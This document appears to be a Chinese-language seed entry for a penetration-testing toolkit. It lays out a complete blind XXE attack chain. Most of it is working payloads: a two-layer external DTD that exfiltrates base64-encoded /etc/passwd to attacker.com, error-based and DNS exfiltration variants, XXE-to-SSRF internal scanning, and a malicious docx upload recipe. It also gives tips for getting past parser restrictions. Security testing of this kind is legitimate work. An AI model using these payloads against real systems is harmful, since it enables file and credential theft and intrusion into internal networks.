# [种子] XXE 盲注 OOB → 外带 /etc/passwd 与内网探测

## 场景分类
渗透测试 / Web 漏洞利用

## 目标概述
某 Web 接口接受 XML 请求体（SOAP / 上传 docx 解析 / 自定义 API），不回显内容（即"盲 XXE"）。利用外部 DTD + 参数实体技巧把目标文件外带回攻击者服务器。

## 完整执行链路

1. 探测点
   - 任何 Content-Type 含 `xml` / `soap` / 文件上传 docx/xlsx/pptx（含 XML）/ SVG
   - 注入测试 payload 后看响应：报错 / 时延 / OOB 回连
2. 首先试有回显的简单 XXE
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
   <r>&x;</r>
   ```
3. 无回显但 OOB 通 → 用外部 DTD
   - 在自己 VPS 上放 evil.dtd
   - 触发服务器加载并外带
4. OOB 也不通 → 看是否能用 error-based / blind boolean
5. 拿到 /etc/passwd 后扩展面：
   - 内网端口扫描（XXE → SSRF）
   - 读应用配置文件（数据库密码 / 私钥）
   - 触发 SSRF 打云元数据 → 见 seed-006

## 踩坑记录

| 问题 | 原因 | 解决方案 | 耗时 |
|------|------|---------|------|
| 直接 SYSTEM "file://" 报错 | 解析器禁用了 ENTITY 引用 | 改用参数实体 (%) 嵌套 | 30min |
| 文件含 `<` `>` `&` 导致 DTD 解析爆炸 | XML 规范禁止参数实体里有特殊字符 | 用 `php://filter` 包一层 base64 | 40min |
| OOB 服务器 80 端口收到回连但 payload 没拼接好 | DTD 嵌套层数搞错 | 严格对照 OOB 模板（外层 + 内层） | 1h |
| 文件读取了但只读到一半 | XML 限制实体长度（XML_MAX_TOKEN_BYTES） | 分段读取 + 偏移 | 1h |
| 内网 SSRF 全是 connection refused | 应用所在网段没开内部服务 | 改 localhost / 127.0.0.1 / 内部 service 名（K8s） | 30min |
| Java 应用打不通 | Java 默认 XML 解析器禁了 SYSTEM | 试 `jar:` 协议 / 或换 SOAP 接口可能用的是 Apache Xerces 老版本 | 数小时 |

## 工具链发现

- **XXEinjector** 自动化 XXE 利用（Ruby）
- **Burp Collaborator** / **interactsh** 是 OOB 必备
- **dnslog.cn / oast.online** 国内/国外 DNS-only OOB
- 上传文件场景：**docx 是 zip + xml**，把 word/document.xml 改了再压缩回去就能注入
- **payloads-all-the-things** XXE 章节是最全 cheatsheet

## 关键代码/命令

OOB 标准两层 DTD（内带 base64 文件外带）：

**evil.dtd（放在攻击者 VPS）**：

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com:8000/exfil?d=%file;'>">
%all;
```

**目标请求体**：

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://attacker.com:8000/evil.dtd">
  %remote;
  %send;
]>
<r>any</r>
```

**攻击者起 HTTP 服务收数据**：

```bash
python3 -m http.server 8000
# 收到 GET /exfil?d=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo...
echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo=' | base64 -d
# → root:x:0:0:root:/root:/bin/bash
```

XXE → SSRF 内网扫描：

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://172.16.0.10:8080/admin">]>
<r>&x;</r>
```

错误回显（error-based）—— 让 XML 解析器在错误信息里返回内容：

```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<r>x</r>
```

**docx 上传 XXE**（很多文档处理类应用受影响）：

```bash
unzip target.docx -d unpacked/
# 编辑 unpacked/word/document.xml，把开头改成：
# <?xml version="1.0"?>
# <!DOCTYPE w:document [...XXE payload...]>
zip -r evil.docx unpacked/*
# 上传 evil.docx
```

## 对本包的改进建议

- `pentest-tools/references/web-attack-cheatsheet.md` 应该有 XXE 完整章节（OOB / error / blind / docx upload / svg）
- bootstrap manifest 增加 interactsh-client（如果还没）
- routing 已含 XXE，但建议显式加"XXE OOB 外带"路由

## 可复用的模式/脚本片段

**XXE 类型决策树**：

```text
有回显     → 直接 SYSTEM "file://" 出
报错有回显 → error-based payload（嵌套两层 + 故意触发解析失败）
全无回显   → OOB 标准两层 DTD（DNS / HTTP）
DNS 通 HTTP 不通 → 用 DNS exfil（base32 编码后做子域）
```

**XXE 协议清单（按解析器测试）**：

```text
file://          → 读本地文件（最常见）
http://, https:// → SSRF
ftp://           → 老版本 Java 也支持
gopher://        → 极少数 PHP 解析器
expect://        → PHP 安装 expect 扩展时可命令执行
jar://           → Java 解压远程 jar 中文件
netdoc://        → 老版本 Java 替代 file://
```

**DNS exfil（最弱通道）**：

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; ext SYSTEM 'http://%file;.attacker.com/x'>">
%eval;
%ext;
<!-- DNS log 收到 hostname.attacker.com -->
```

## 进化动作
- [ ] web-attack-cheatsheet.md 增加 XXE 完整章节
- [ ] bootstrap-manifest 检查 interactsh-client
- [x] routing 已含 XXE 入口

## 环境信息
- 攻击者 VPS（公网 IP，开放 80/8000/53）
- 目标: 任何接受 XML 输入的 Web（PHP/Java/Python lxml/.NET 都受影响）
- OOB: interactsh / dnslog.cn / 自建 DNS

## 脱敏要求
本条目为种子数据，基于公开 Web 漏洞利用模式编写，不涉及真实生产目标。所有域名/IP 为占位符。
